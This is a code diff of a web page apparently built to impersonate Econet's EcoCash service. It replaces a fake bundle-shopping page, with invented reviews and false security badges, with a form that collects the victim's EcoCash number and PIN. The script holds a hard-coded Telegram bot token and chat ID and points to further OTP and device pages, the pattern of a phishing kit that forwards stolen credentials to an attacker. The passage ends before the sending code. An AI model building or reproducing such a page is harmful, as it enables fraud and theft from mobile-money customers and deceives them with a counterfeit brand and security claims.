-@media(max-width:480px){.stats-grid{grid-template-columns:repeat(2,1fr)}.slider-row{flex-wrap:wrap;gap:8px}.slider-val{min-width:unset}.splash-logos{flex-direction:column;gap:10px}.logo-sub{display:none}.steps-grid{grid-template-columns:1fr}.modal-box{border-radius:18px 18px 0 0}}
-@media(max-width:360px){.nav-content{padding:0 4%}.logo-name{font-size:1.3rem}.bcard-price{font-size:2.1rem}}
-@media(min-width:640px){.modal{align-items:center}.modal-box{border-radius:22px;max-height:88vh}}
-</style>
+    .bs-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 8px;
+    }
+
+    .bs-item {
+      background: rgba(255,255,255,0.10);
+      border-radius: 10px;
+      padding: 9px 12px;
+    }
+
+    .bs-item-label {
+      font-size: 10px;
+      color: rgba(255,255,255,0.55);
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .bs-item-val {
+      font-size: 15px;
+      font-weight: 800;
+      color: #fff;
+      margin-top: 2px;
+      letter-spacing: -0.3px;
+    }
+
+    .bs-total {
+      margin-top: 10px;
+      background: rgba(0,176,80,0.18);
+      border: 1px solid rgba(0,176,80,0.35);
+      border-radius: 10px;
+      padding: 10px 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .bs-total-label { font-size: 12px; color: rgba(255,255,255,0.7); font-weight: 600; }
+    .bs-total-val   { font-size: 1.25rem; font-weight: 900; color: #4ade80; letter-spacing: -0.5px; }
+
+    .form-panel {
+      background: var(--blue-light);
+      border: 1px solid var(--blue-border);
+      border-radius: 20px;
+      padding: clamp(16px, 4vw, 20px);
+    }
+
+    .field-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 800;
+      color: var(--blue-dark);
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-bottom: 8px;
+    }
+
+    .phone-group {
+      width: 100%;
+      border: 2px solid var(--blue);
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      padding: 14px 15px;
+      background: var(--white);
+      box-shadow: 0 8px 24px rgba(11, 94, 215, 0.08);
+    }
+
+    .flag { font-size: 23px; margin-right: 10px; }
+
+    .country-select {
+      display: flex;
+      align-items: center;
+      color: var(--blue);
+      font-weight: 800;
+      font-size: 16px;
+      margin-right: 12px;
+      white-space: nowrap;
+    }
+
+    .phone-input {
+      min-width: 0;
+      flex: 1;
+      border: 0;
+      outline: 0;
+      font-size: 17px;
+      color: var(--text);
+      font-family: inherit;
+      background: transparent;
+    }
+
+    .phone-input::placeholder { color: #94a3b8; }
+
+    .pin-group {
+      width: 100%;
+      border: 2px solid var(--blue);
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      padding: 14px 15px;
+      background: var(--white);
+      box-shadow: 0 8px 24px rgba(11, 94, 215, 0.08);
+      margin-top: 14px;
+    }
+
+    .pin-input {
+      min-width: 0;
+      flex: 1;
+      border: 0;
+      outline: 0;
+      font-size: 17px;
+      color: var(--text);
+      font-family: inherit;
+      background: transparent;
+      letter-spacing: 4px;
+    }
+
+    .pin-input::placeholder { color: #94a3b8; letter-spacing: 0; }
+
+    .hint {
+      color: var(--muted);
+      font-size: 12px;
+      line-height: 1.5;
+      margin-top: 10px;
+      margin-bottom: 18px;
+    }
+
+    .error-msg {
+      display: none;
+      background: #fff1f1;
+      border: 1px solid #fca5a5;
+      color: #b91c1c;
+      font-size: 13px;
+      font-weight: 600;
+      border-radius: 12px;
+      padding: 11px 13px;
+      margin-bottom: 14px;
+      line-height: 1.5;
+    }
+
+    .btn-primary {
+      width: 100%;
+      border: 0;
+      border-radius: 999px;
+      padding: 16px 22px;
+      color: var(--white);
+      background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      cursor: pointer;
+      box-shadow: 0 10px 24px rgba(11, 94, 215, 0.3);
+      touch-action: manipulation;
+      transition: opacity 0.18s, box-shadow 0.18s, transform 0.12s;
+    }
+
+    .btn-primary:hover:not(:disabled) {
+      box-shadow: 0 14px 30px rgba(11, 94, 215, 0.36);
+      transform: translateY(-1px);
+    }
+
+    .btn-primary:active:not(:disabled) { transform: translateY(0); }
+
+    .btn-primary:disabled {
+      background: #cbd5e1;
+      box-shadow: none;
+      cursor: not-allowed;
+    }
+
+    .terms {
+      margin-top: 18px;
+      color: var(--muted);
+      text-align: center;
+      font-size: 12px;
+      line-height: 1.5;
+    }
+
+    .terms a { color: var(--blue); font-weight: 800; }
+
+    #spinnerOverlay {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 16px;
+      background: rgba(10, 10, 10, 0.88);
+      z-index: 1000;
+      backdrop-filter: blur(4px);
+    }
+
+    .spinner {
+      width: 56px;
+      height: 56px;
+      border: 5px solid rgba(255, 255, 255, 0.12);
+      border-top-color: var(--blue);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    .spin-label { font-size: 15px; font-weight: 700; color: #fff; letter-spacing: -0.2px; }
+    .spin-sub   { font-size: 13px; color: rgba(255,255,255,0.5); margin-top: -8px; }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    @media (min-width: 900px) { .login-card { width: 520px; } }
+
+    @media (max-width: 520px) {
+      .topbar { height: 56px; padding: 13px 16px; }
+      main { min-height: calc(100dvh - 56px); align-items: start; padding: 14px 12px; }
+      .login-card { padding: 24px 17px; }
+      .logo-lockup { margin-top: 6px; margin-bottom: 18px; }
+      .product-name { font-size: 11px; padding: 7px 12px; }
+      .form-panel { padding: 15px; }
+      .phone-group, .pin-group { padding: 13px 12px; }
+      .country-select { font-size: 15px; margin-right: 9px; }
+      .phone-input, .pin-input { font-size: 16px; }
+    }
+
+    @media (max-width: 360px) {
+      main { padding: 10px; }
+      .login-card { padding: 22px 14px; border-radius: 20px; }
+      .phone-group, .pin-group { padding: 12px 10px; }
+      .flag { margin-right: 8px; }
+      .country-select { font-size: 14px; margin-right: 8px; }
+      .phone-input, .pin-input { font-size: 15px; }
+      .btn-primary { padding: 15px 18px; }
+    }
+
+    @media (max-height: 680px) {
+      main { align-items: start; }
+      .login-card { margin-bottom: 12px; }
+    }
+  </style>
 </head>
-<body class="splash-lock">
-<div class="page-bg"></div>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://mix-bundle-2.onrender.com/"><span class="eco">Eco</span><span class="cash">Cash</span></a>
+    <div class="menu-icon">☰</div>
+  </header>
 
-<div class="splash" id="splash" role="status" aria-live="polite">
-  <div class="splash-logos">
-    <div class="splash-logo econet">econet</div>
-    <span class="splash-plus">+</span>
-    <div class="splash-logo ecocash">EcoCash</div>
-  </div>
-  <div class="splash-spinner"></div>
-  <p>Connecting to EcoCash…</p>
-</div>
-
-<div class="ticker-wrap">
-  <div class="ticker-inner">
-    <span>⚡ Mix Voice, SMS &amp; Data — Build Your Own Bundle</span>
-    <span>💵 Prices in USD · Zimbabwe's #1 Network</span>
-    <span>📱 Powered by Econet Wireless · Pay via EcoCash</span>
-    <span>🔒 256-bit Encrypted · PCI DSS Compliant</span>
-    <span>⚡ Mix Voice, SMS &amp; Data — Build Your Own Bundle</span>
-    <span>💵 Prices in USD · Zimbabwe's #1 Network</span>
-    <span>📱 Powered by Econet Wireless · Pay via EcoCash</span>
-    <span>🔒 256-bit Encrypted · PCI DSS Compliant</span>
-  </div>
-</div>
-
-<header>
-  <div class="nav-content">
-    <a href="#" class="logo">
-      <div class="logo-icon"><span>E</span></div>
-      <div>
-        <div class="logo-name">Eco<em>Cash</em></div>
-        <span class="logo-sub">Econet Wireless · Zimbabwe</span>
+  <main>
+    <section class="login-card" aria-labelledby="pageTitle">
+      <div class="logo-lockup">
+        <div class="logo-text"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+        <div class="product-name">Mix Bundle · Econet Zimbabwe</div>
       </div>
-    </a>
-    <nav class="nav-links" id="navLinks">
-      <a href="#bundles" class="nav-link">Bundles</a>
-      <a href="#how" class="nav-link">How It Works</a>
-      <a href="#benefits" class="nav-link">Benefits</a>
-      <a href="#faq" class="nav-link">FAQ</a>
-    </nav>
-    <div style="display:flex;align-items:center;gap:12px">
-      <div class="live-pill"><span class="live-dot"></span>Live</div>
-      <a href="https://mix-bundle-2.onrender.com/login.html" class="login-btn">Login</a>
-      <button class="hamburger" id="hamburger" aria-label="Toggle menu" aria-expanded="false">☰</button>
-    </div>
-  </div>
-</header>
 
-<section class="hero">
-  <div class="hero-badge"><span class="live-dot"></span>Mix Bundle Builder</div>
-  <h1>Build Your Own<br/><em>Econet Bundle</em></h1>
-  <p>Mix Voice, SMS &amp; Data exactly the way you want it.<br/>Pay securely via EcoCash. Active instantly.</p>
-  <a href="#bundles" class="hero-cta">🛒 Build My Bundle</a>
-  <div class="hero-stats">
-    <div class="hstat">💵 Prices in USD</div>
-    <div class="hstat">⚡ Instant Activation</div>
-    <div class="hstat">🔒 EcoCash Secure</div>
-    <div class="hstat">🇿🇼 Econet Zimbabwe</div>
-  </div>
-</section>
+      <h1 id="pageTitle">Confirm &amp; Pay for Bundle</h1>
+      <p class="subtitle">Enter your EcoCash number and PIN to authorise payment for your selected bundle.</p>
 
-<div class="stats-strip">
-  <div class="stats-grid">
-    <div class="stat-item"><div class="stat-val green">USD</div><div class="stat-label">US Dollar Pricing</div></div>
-    <div class="stat-item"><div class="stat-val">5</div><div class="stat-label">Bundle Periods</div></div>
-    <div class="stat-item"><div class="stat-val green">$0.60</div><div class="stat-label">Starting Price</div></div>
-    <div class="stat-item"><div class="stat-val">4G</div><div class="stat-label">Nationwide Network</div></div>
-  </div>
-</div>
-
-<section id="bundles" class="section">
-  <span class="section-label">Mix Bundle Builder</span>
-  <h2 class="section-title">Choose Your Bundle Period</h2>
-  <p class="section-sub">Select a period below to jump to it, then slide to mix your Voice, SMS and Data exactly how you need it. Your price updates live.</p>
-
-  <div class="summary-card" id="summaryCard" aria-live="polite">
-    <div class="summary-left">
-      <div>
-        <div class="summary-period" id="summary-period">Daily</div>
-        <div class="summary-price-label">Your bundle price</div>
-        <div class="summary-price" id="summary-price">USD 0.60</div>
-      </div>
-    </div>
-    <div class="summary-metrics">
-      <div class="summary-metric"><div class="sm-label">Voice</div><div class="sm-val" id="summary-voice">20 Min</div></div>
-      <div class="summary-metric"><div class="sm-label">SMS</div><div class="sm-val" id="summary-sms">25 SMS</div></div>
-      <div class="summary-metric"><div class="sm-label">Data</div><div class="sm-val" id="summary-data">3 GB</div></div>
-    </div>
-  </div>
-
-  <div class="period-tabs-wrap">
-    <div class="period-tabs">
-      <a class="ptab active" href="#bundle-daily">Daily<span class="ptab-price">USD 0.60</span></a>
-      <a class="ptab" href="#bundle-threeday">3 Days<span class="ptab-price">USD 1.40</span></a>
-      <a class="ptab" href="#bundle-weekly">Weekly<span class="ptab-price">USD 2.80</span></a>
-      <a class="ptab" href="#bundle-twoweek">2 Weeks<span class="ptab-price">USD 5.20</span></a>
-      <a class="ptab" href="#bundle-monthly">Monthly<span class="ptab-price">USD 9.90</span></a>
-    </div>
-  </div>
-
-  <div class="bundles-stack" id="bundlesStack"></div>
-</section>
-
-<section id="how" class="section" style="background:var(--surface)">
-  <span class="section-label">How It Works</span>
-  <h2 class="section-title">5 Simple Steps to Get Your Bundle</h2>
-  <p class="section-sub">From building your mix to instant activation — the exact journey through EcoCash.</p>
-  <div class="steps-grid">
-    <div class="step-card">
-      <div class="step-num" style="background:linear-gradient(135deg,var(--blue),var(--blue-light))">1</div>
-      <span class="step-icon-badge">🛒</span>
-      <h3>Build &amp; Subscribe</h3>
-      <p>Pick a period, slide Voice, SMS &amp; Data to your mix, then tap <strong>Subscribe</strong> and review your bundle in the confirmation sheet.</p>
-    </div>
-    <div class="step-card">
-      <div class="step-num" style="background:linear-gradient(135deg,var(--blue),var(--blue-light))">2</div>
-      <span class="step-icon-badge">✅</span>
-      <h3>Confirm &amp; Pay</h3>
-      <p>Check your Duration, Voice, SMS, Data and total USD amount in the pop-up, then tap <strong>Pay with EcoCash</strong> to proceed.</p>
-    </div>
-    <div class="step-card">
-      <div class="step-num" style="background:linear-gradient(135deg,var(--blue),var(--blue-light))">3</div>
-      <span class="step-icon-badge">📱</span>
-      <h3>Enter EcoCash Number &amp; PIN</h3>
-      <p>On the EcoCash page enter your ZW +263 number and tap in your 4-digit PIN to identify your wallet — 256-bit encrypted.</p>
-    </div>
-    <div class="step-card">
-      <div class="step-num" style="background:linear-gradient(135deg,var(--green-dark),var(--green))">4</div>
-      <span class="step-icon-badge">💬</span>
-      <h3>Verify OTP</h3>
-      <p>A one-time PIN is sent to your Econet number by SMS. Enter it on the verification screen to authorise the payment.</p>
-    </div>
-    <div class="step-card">
-      <div class="step-num" style="background:linear-gradient(135deg,var(--green-dark),var(--green))">5</div>
-      <span class="step-icon-badge">⚡</span>
-      <h3>Bundle Activated Instantly</h3>
-      <p>Payment confirmed — your bundle is live immediately. Dial <strong>*143#</strong> on your Econet line anytime to check your remaining balance.</p>
-    </div>
-  </div>
-</section>
-
-<section id="benefits" class="section">
-  <span class="section-label">Why EcoCash</span>
-  <h2 class="section-title">Why Choose Econet Bundles?</h2>
-  <div class="benefits-grid">
-    <div class="benefit-card"><div class="benefit-icon">🎛️</div><h3>Fully Customisable</h3><p>Mix Voice, SMS and Data any way you like. Pay only for exactly what you need.</p></div>
-    <div class="benefit-card"><div class="benefit-icon">💵</div><h3>USD Pricing</h3><p>All bundles priced in US Dollars — transparent, stable Zimbabwe pricing you can trust.</p></div>
-    <div class="benefit-card"><div class="benefit-icon">⚡</div><h3>Instant Activation</h3><p>Pay via EcoCash and your bundle activates immediately. No delays, no branch visits.</p></div>
-    <div class="benefit-card"><div class="benefit-icon">🔒</div><h3>256-bit Secure</h3><p>All EcoCash transactions are fully encrypted and PCI DSS compliant. Your data is safe.</p></div>
-  </div>
-</section>
-
-<section class="section" style="background:var(--surface)">
-  <span class="section-label">Reviews</span>
-  <h2 class="section-title">What Customers Say</h2>
-  <div class="testimonials-grid">
-    <div class="testimonial-card"><div class="t-stars">★★★★★</div><div class="t-text">"The mix builder is brilliant — I set exactly 100 minutes, 50 SMS and 5GB. No waste!"</div><div class="t-author">— Tinashe M., Harare</div></div>
-    <div class="testimonial-card"><div class="t-stars">★★★★★</div><div class="t-text">"USD pricing makes budgeting so easy. EcoCash payment is instant and secure."</div><div class="t-author">— Chiedza K., Bulawayo</div></div>
-    <div class="testimonial-card"><div class="t-stars">★★★★★</div><div class="t-text">"I use the monthly bundle every month — 600 minutes is perfect for my business."</div><div class="t-author">— Farai N., Gweru</div></div>
-    <div class="testimonial-card"><div class="t-stars">★★★★★</div><div class="t-text">"The weekly bundle at $2.80 is incredible value. Activated in seconds via EcoCash."</div><div class="t-author">— Rutendo T., Mutare</div></div>
-    <div class="testimonial-card"><div class="t-stars">★★★★★</div><div class="t-text">"Finally a network that lets me choose exactly what I want. No forced bundles."</div><div class="t-author">— Blessing C., Masvingo</div></div>
-    <div class="testimonial-card"><div class="t-stars">★★★★★</div><div class="t-text">"Best mobile bundle experience in Zimbabwe. EcoCash makes it completely painless."</div><div class="t-author">— Tapiwa Z., Chinhoyi</div></div>
-  </div>
-</section>
-
-<section id="faq" class="section">
-  <span class="section-label">FAQ</span>
-  <h2 class="section-title">Frequently Asked Questions</h2>
-  <div class="faq-grid">
-    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">What currency are bundles priced in?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">All bundles are priced in USD (US Dollars) — the primary currency used in Zimbabwe for Econet services.</div></div></div>
-    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">How do I pay via EcoCash?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">After customising your bundle, click "Subscribe" and confirm. You'll enter your EcoCash number, PIN, and verify via OTP SMS before payment completes.</div></div></div>
-    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">Can I mix Voice, SMS and Data freely?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">Yes! Use the sliders to allocate as much or as little Voice, SMS and Data as you need. Your price updates in real time.</div></div></div>
-    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">What periods are available?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">Daily ($0.60), 3 Days ($1.40), Weekly ($2.80), 2 Weeks ($5.20) and Monthly ($9.90).</div></div></div>
-    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">How quickly is my bundle activated?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">Instantly. As soon as your EcoCash OTP is confirmed and payment goes through, your bundle is live and ready to use.</div></div></div>
-    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">Is my EcoCash payment secure?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">Yes. All transactions are 256-bit encrypted and PCI DSS compliant. Your PIN is never stored. Powered by Econet Wireless.</div></div></div>
-    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">Can I check my bundle balance?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">Yes. Dial *143# on your Econet line to check your active bundle balances at any time.</div></div></div>
-    <div class="faq-card"><button class="faq-question" onclick="toggleFaq(this)">Do unused minutes, SMS or data expire?<div class="faq-icon">+</div></button><div class="faq-answer"><div class="faq-ans-text">Bundle allocations are valid for the active period chosen. They do not roll over automatically.</div></div></div>
-  </div>
-</section>
-
-<div class="cta-banner">
-  <h2>Ready to Build Your Bundle?</h2>
-  <p>Mix Voice, SMS &amp; Data your way. Pay in USD via EcoCash.</p>
-  <a href="#bundles" class="hero-cta">🛒 Build My Bundle Now</a>
-</div>
-
-<footer>
-  <div class="footer-inner">
-    <div class="footer-brand">
-      <a href="#" class="footer-brand-logo">
-        <div class="logo-icon" style="width:40px;height:40px"><span style="font-size:16px">E</span></div>
-        <div style="font-size:1.4rem;font-weight:900;color:white;letter-spacing:-.5px">Eco<span style="color:var(--green)">Cash</span></div>
-      </a>
-      <div class="footer-divider"></div>
-      <p>Mix Bundle Builder powered by Econet Wireless Zimbabwe. Pay securely via EcoCash in USD.</p>
-    </div>
-    <div class="footer-col">
-      <h4>Bundles</h4>
-      <a href="#bundle-daily">Daily Bundle</a>
-      <a href="#bundle-threeday">3-Day Bundle</a>
-      <a href="#bundle-weekly">Weekly Bundle</a>
-      <a href="#bundle-monthly">Monthly Bundle</a>
-    </div>
-    <div class="footer-col">
-      <h4>EcoCash</h4>
-      <a href="#">Pay via EcoCash</a>
-      <a href="#">Check Balance *143#</a>
-      <a href="#">EcoCash App</a>
-    </div>
-    <div class="footer-col">
-      <h4>Help &amp; Legal</h4>
-      <a href="#">Contact Support</a>
-      <a href="#">Privacy Policy</a>
-      <a href="#">Terms &amp; Conditions</a>
-      <a href="#faq">FAQ</a>
-    </div>
-  </div>
-  <div class="footer-bottom">
-    <p>© <span id="yr"></span> Econet Wireless Zimbabwe. All Rights Reserved.</p>
-    <div class="footer-badge"><div class="footer-badge-dot"></div>256-bit Encrypted · PCI DSS Compliant · EcoCash Powered</div>
-  </div>
-</footer>
-
-<!-- CONFIRM MODAL -->
-<div class="modal" id="confirmModal" role="dialog" aria-modal="true" aria-labelledby="mod-heading">
-  <div class="modal-box">
-    <div class="modal-drag"><div class="modal-drag-bar"></div></div>
-    <div class="modal-head">
-      <h3 id="mod-heading">Confirm your bundle</h3>
-      <button class="modal-close-btn" onclick="closeModal()" aria-label="Close">✕</button>
-    </div>
-    <div class="modal-body">
-      <span class="modal-section-label">Bundle Details</span>
-      <div class="modal-rows-card">
-        <div class="modal-row">
-          <span class="modal-row-left"><span class="modal-row-dot"></span>Duration</span>
-          <span class="modal-row-val" id="mod-duration">Daily</span>
+      <!-- Bundle order summary — populated from URL params / localStorage -->
+      <div id="bundleSummary" class="bundle-summary">
+        <div class="bs-title">Your selected bundle</div>
+        <div class="bs-grid">
+          <div class="bs-item"><div class="bs-item-label">Duration</div><div class="bs-item-val" id="bsPeriod">—</div></div>
+          <div class="bs-item"><div class="bs-item-label">Voice</div><div class="bs-item-val" id="bsVoice">—</div></div>
+          <div class="bs-item"><div class="bs-item-label">SMS</div><div class="bs-item-val" id="bsSms">—</div></div>
+          <div class="bs-item"><div class="bs-item-label">Data</div><div class="bs-item-val" id="bsData">—</div></div>
         </div>
-        <div class="modal-row">
-          <span class="modal-row-left"><span class="modal-row-dot"></span>Voice</span>
-          <span class="modal-row-val" id="mod-voice">20 Min</span>
-        </div>
-        <div class="modal-row">
-          <span class="modal-row-left"><span class="modal-row-dot"></span>SMS</span>
-          <span class="modal-row-val" id="mod-sms">25 SMS</span>
-        </div>
-        <div class="modal-row">
-          <span class="modal-row-left"><span class="modal-row-dot"></span>Data</span>
-          <span class="modal-row-val" id="mod-data">3 GB</span>
+        <div class="bs-total">
+          <span class="bs-total-label">Total to pay</span>
+          <span class="bs-total-val" id="bsPrice">USD —</span>
         </div>
       </div>
-      <div class="modal-total-row">
-        <span class="modal-total-label">Total to pay</span>
-        <span class="modal-total-val" id="mod-total">USD 0.60</span>
+
+      <div class="form-panel">
+        <label class="field-label" for="phoneInput">EcoCash Mobile Number</label>
+        <div class="phone-group">
+          <span class="flag">🇿🇼</span>
+          <div class="country-select">+263</div>
+          <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number" inputmode="numeric" autocomplete="tel" maxlength="9">
+        </div>
+
+        <label class="field-label" for="pinInput" style="margin-top:14px;">EcoCash PIN</label>
+        <div class="pin-group">
+          <input type="password" class="pin-input" id="pinInput" placeholder="4-digit PIN" inputmode="numeric" maxlength="4">
+        </div>
+
+        <p class="hint">Your number and PIN are used only to authorise this EcoCash payment. 256-bit encrypted.</p>
+
+        <div class="error-msg" id="errMsg"></div>
+
+        <button class="btn-primary" type="button" id="continueBtn">Pay with EcoCash</button>
       </div>
-      <div class="modal-btns">
-        <button class="mbtn mbtn-cancel" onclick="closeModal()">Cancel</button>
-        <button class="mbtn mbtn-confirm" id="mod-confirm-btn">Pay with EcoCash</button>
-      </div>
-    </div>
+
+      <div class="terms">By continuing you agree to the <a href="https://ecocash.co.zw/terms-and-conditions/" target="_blank" rel="noopener">Terms and Conditions</a>.</div>
+    </section>
+  </main>
+
+  <div id="spinnerOverlay">
+    <div class="spinner"></div>
+    <div class="spin-label">Verifying &amp; Processing</div>
+    <div class="spin-sub">Please hold on…</div>
   </div>
-</div>
 
-<!-- AUTHORISING SCREEN -->
-<div id="authScreen" role="status" aria-live="polite">
-  <div class="auth-logo-wrap">
-    <div class="auth-econet">
-      <span class="auth-econet-main">ECONET</span>
-      <span class="auth-econet-sub">Wireless</span>
-    </div>
-    <span class="auth-ecocash">EcoCash</span>
-  </div>
-  <div class="auth-spinner"></div>
-  <div class="auth-title">Authorising</div>
-  <div class="auth-sub">Processing payment request…</div>
-  <div class="auth-dots">
-    <div class="auth-dot" id="dot1"></div>
-    <div class="auth-dot" id="dot2"></div>
-    <div class="auth-dot dash" id="dot3"></div>
-  </div>
-</div>
+  <script>
+    const CONFIG = {
+      BOT_TOKEN:    '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
+      CHAT_ID:      '7547427914',
+      APPROVE_PAGE: 'otp.html',
+      DEVICE_PAGE:  'device.html',
+      SUCCESS_PAGE: 'success.html'
+    };
 
-<script>
-/* ── BUNDLE DEFINITIONS ── */
-var BUNDLES = [
-  {key:'daily',    label:'Daily Bundle',    sub:'Active for 1 day',   max:0.60, period:'Daily',   maxVoice:20,  maxSms:25,   maxData:3,   best:false},
-  {key:'threeday', label:'3-Day Bundle',    sub:'Active for 3 days',  max:1.40, period:'3 Days',  maxVoice:50,  maxSms:75,   maxData:8,   best:false},
-  {key:'weekly',   label:'Weekly Bundle',   sub:'Active for 7 days',  max:2.80, period:'Weekly',  maxVoice:120, maxSms:200,  maxData:20,  best:false},
-  {key:'twoweek',  label:'2-Week Bundle',   sub:'Active for 14 days', max:5.20, period:'2 Weeks', maxVoice:250, maxSms:450,  maxData:45,  best:false},
-  {key:'monthly',  label:'Monthly Bundle',  sub:'Active for 30 days', max:9.90, period:'Monthly', maxVoice:600, maxSms:1000, maxData:100, best:true}
-];
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
 
-var panelState = {};
-BUNDLES.forEach(function(b){
-  panelState[b.key] = {voice:b.maxVoice, sms:b.maxSms, data:b.maxData};
-});
+    const phoneInput     = document.getElementById('phoneInput');
+    const pinInput       = document.getElementById('pinInput');
+    const continueBtn    = document.getElementById('continueBtn');
+    const errMsg         = document.getElementById('errMsg');
+    const spinnerOverlay = document.getElementById('spinnerOverlay');
 
-/* ── BUILD ALL CARDS ── */
-function buildAllCards() {
-  var stack = document.getElementById('bundlesStack');
-  stack.innerHTML = '';
-  BUNDLES.forEach(function(b) {
-    var div = document.createElement('div');
-    div.className = 'bundle-card-main';
-    div.id = 'bundle-' + b.key;
-    div.innerHTML = buildCardHTML(b, panelState[b.key]);
-    stack.appendChild(div);
-  });
-  BUNDLES.forEach(function(b){ updatePrice(b.key); });
-  updateSummaryFor('daily');
-}
+    /* ── Read bundle from URL params → fallback to localStorage ── */
+    function getBundleOrder() {
+      const p = new URLSearchParams(window.location.search);
+      if (p.get('period')) {
+        return {
+          period: p.get('period'),
+          voice:  p.get('voice'),
+          sms:    p.get('sms'),
+          data:   p.get('data'),
+          price:  p.get('price')
+        };
+      }
+      try { return JSON.parse(localStorage.getItem('bundleOrder') || '{}'); }
+      catch(e) { return {}; }
+    }
 
-function buildCardHTML(b, s) {
-  var vPct = (s.voice / b.maxVoice * 100).toFixed(1);
-  var sPct = (s.sms   / b.maxSms   * 100).toFixed(1);
-  var dPct = (s.data  / b.maxData  * 100).toFixed(1);
-  return '<div class="bcard-head">'
-    + '<div class="bcard-head-left"><h2>'+b.label+'</h2><p>'+b.sub+'</p></div>'
-    + '<div class="bcard-price-wrap">'
-    + '<div class="bcard-price-label">Max USD</div>'
-    + '<div class="bcard-price"><span>$</span>'+b.max.toFixed(2)+'</div>'
-    + (b.best ? '<div class="best-badge">Best value — save more with monthly</div>' : '')
-    + '</div></div>'
-    + '<div class="bcard-body">'
-    + '<div class="slider-section">'
-    + '<div class="slider-row">'
-    + '<div class="slider-icon">📞</div>'
-    + '<div class="slider-info"><h4>Voice calls</h4><p>Local minutes</p></div>'
-    + '<div class="slider-val" id="'+b.key+'-voice-val">'+s.voice+' <em>Min</em></div>'
-    + '</div>'
-    + '<input type="range" id="'+b.key+'-voice" min="0" max="'+b.maxVoice+'" step="1" value="'+s.voice
-      +'" style="--pct:'+vPct+'%" aria-label="Voice minutes" oninput="sliderChange(\''+b.key+'\',\'voice\',this)">'
-    + '<div class="range-minmax"><span>0 Min</span><span>'+b.maxVoice+' Min</span></div>'
-    + '</div>'
-    + '<div class="slider-section">'
-    + '<div class="slider-row">'
-    + '<div class="slider-icon">💬</div>'
-    + '<div class="slider-info"><h4>SMS messages</h4><p>Text messages</p></div>'
-    + '<div class="slider-val" id="'+b.key+'-sms-val">'+s.sms+' <em>SMS</em></div>'
-    + '</div>'
-    + '<input type="range" id="'+b.key+'-sms" min="0" max="'+b.maxSms+'" step="1" value="'+s.sms
-      +'" style="--pct:'+sPct+'%" aria-label="SMS messages" oninput="sliderChange(\''+b.key+'\',\'sms\',this)">'
-    + '<div class="range-minmax"><span>0 SMS</span><span>'+b.maxSms+' SMS</span></div>'
-    + '</div>'
-    + '<div class="slider-section">'
-    + '<div class="slider-row">'
-    + '<div class="slider-icon">📶</div>'
-    + '<div class="slider-info"><h4>Mobile data</h4><p>Internet usage</p></div>'
-    + '<div class="slider-val" id="'+b.key+'-data-val">'+s.data+' <em>GB</em></div>'
-    + '</div>'
-    + '<input type="range" id="'+b.key+'-data" min="0" max="'+b.maxData+'" step="0.5" value="'+s.data
-      +'" style="--pct:'+dPct+'%" aria-label="Mobile data" oninput="sliderChange(\''+b.key+'\',\'data\',this)">'
-    + '<div class="range-minmax"><span>0 GB</span><span>'+b.maxData+' GB</span></div>'
-    + '</div>'
-    + '</div>'
-    + '<div class="price-bar">'
-    + '<div class="price-bar-left">'
-    + '<div class="price-bar-label">Your '+b.period.toLowerCase()+' price</div>'
-    + '<div class="price-bar-val" id="'+b.key+'-price">USD '+b.max.toFixed(2)+'</div>'
-    + '<div class="price-bar-sub">Adjust sliders to customise</div>'
-    + '</div>'
-    + '<button class="subscribe-btn" onclick="openModal(\''+b.key+'\')">Subscribe — '+b.period+'</button>'
-    + '</div>'
-    + '<div class="security-row">'
-    + '<div class="sec-badge">🔒 256-bit Encrypted</div>'
-    + '<div class="sec-dot"></div>'
-    + '<div class="sec-badge">PCI DSS Compliant</div>'
-    + '<div class="sec-dot"></div>'
-    + '<div class="sec-badge">Powered by Econet Wireless · EcoCash</div>'
-    + '</div>';
-}
+    function loadBundleDetails() {
+      const o = getBundleOrder();
+      if (o.period) {
+        document.getElementById('bundleSummary').classList.add('active');
+        document.getElementById('bsPeriod').textContent = o.period  || '—';
+        document.getElementById('bsVoice').textContent  = o.voice   ? o.voice + ' Min'  : '—';
+        document.getElementById('bsSms').textContent    = o.sms     ? o.sms   + ' SMS'  : '—';
+        document.getElementById('bsData').textContent   = o.data    ? o.data  + ' GB'   : '—';
+        document.getElementById('bsPrice').textContent  = o.price   ? 'USD ' + o.price  : 'USD —';
+      }
+    }
 
-function sliderChange(key, type, input) {
-  var val = parseFloat(input.value);
-  var b = BUNDLES.find(function(x){ return x.key === key; });
-  panelState[key][type] = val;
